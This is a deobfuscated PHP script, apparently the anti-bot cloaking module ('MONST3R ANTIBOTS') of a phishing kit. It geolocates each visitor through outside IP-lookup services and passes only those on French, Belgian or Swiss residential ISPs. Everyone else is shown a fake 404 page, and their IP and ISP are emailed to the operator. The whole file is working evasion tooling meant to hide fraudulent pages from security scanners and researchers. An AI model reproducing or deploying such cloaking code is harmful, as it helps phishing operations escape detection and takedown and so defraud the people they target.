<?php

echo "\r\n\r\n";
$ds7dR = "inspecteurrez@protonmail.com";
function iUGNe($hO99l = '')
{
    $lyV_2 = file_get_contents("http://ip-api.com/json/" . $hO99l);
    $V5QA_ = json_decode($lyV_2, true);
    return $V5QA_;
}
$iefIG = $_SERVER["REMOTE_ADDR"];
$V5QA_ = IuGNe($iefIG);
$kDknI = "{$V5QA_["as"]}";
if (strpos($kDknI, "wanadoo") || strpos($kDknI, "bbox") || strpos($kDknI, "Bouygues") || strpos($kDknI, "Orange") || strpos($kDknI, "sfr") || strpos($kDknI, "SFR") || strpos($kDknI, "Sfr") || strpos($kDknI, "free") || strpos($kDknI, "Free") || strpos($kDknI, "FREE") || strpos($kDknI, "red") || strpos($kDknI, "proxad") || strpos($kDknI, "club-internet") || strpos($kDknI, "oleane") || strpos($kDknI, "nordnet") || strpos($kDknI, "liberty") || strpos($kDknI, "colt") || strpos($kDknI, "chello") || strpos($kDknI, "belgacom") || strpos($kDknI, "proximus") || strpos($kDknI, "skynet") || strpos($kDknI, "aol") || strpos($kDknI, "neuf") || strpos($kDknI, "darty") || strpos($kDknI, "bouygue") || strpos($kDknI, "numericable") || strpos($kDknI, "Free") || strpos($kDknI, "Num\xc3\xa9ris") || strpos($kDknI, "Poste") || strpos($kDknI, "Sosh")) {
    $sKeT7 = true;
    goto Q8qOS;
}
$sKeT7 = false;
Q8qOS:
$UE7ms = array("France", "Belgium", "Switzerland");
$AxNmt = $_SERVER["REMOTE_ADDR"];
$JkPxR = "http://www.geoplugin.net/php.gp?ip=" . $AxNmt;
$fQGf7 = unserialize(file_get_contents($JkPxR));
$r6tcf = $fQGf7["geoplugin_city"];
$v6V1a = $fQGf7["geoplugin_countryName"];
if (!in_array($v6V1a, $UE7ms)) {
    $UtJbn = true;
    goto yYy01;
}
$UtJbn = false;
yYy01:
if ($UtJbn == false and $sKeT7 == true) {
    $fF0Bf = false;
    uBSnx:
    // [PHPDeobfuscator] Implied script end
    return;
}
$UEJQw = "BOT SUCCESSFULLY BLOCKED";
$IW286 = "\r\n\t\r\n\t\xf0\x9f\x8e\x89 DISALLOWED IP TRIED TO ACCES THE PAGE AND MONST3R ANTIBOTS SUCCESSFULLY BLOCKED IT ! \xf0\x9f\x8e\x89\r\n\t\r\n\tIP : " . $AxNmt . "\r\n\tISP : " . $kDknI . "\r\n\t\r\n\tIf you think that it is an error please report it to @crusix on telegram !\r\n\t\r\n\t\r\n\t";
$odmS_ = "From: \xf0\x9f\x94\x92 A BOT GOT FUCKED BY MONST3R ANTIBOTS \xf0\x9f\x94\x92 <dsqqds@baots.com>";
mail($ds7dR, $UEJQw, $IW286, $odmS_);
header("HTTP/1.0 404 Not Found");
die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
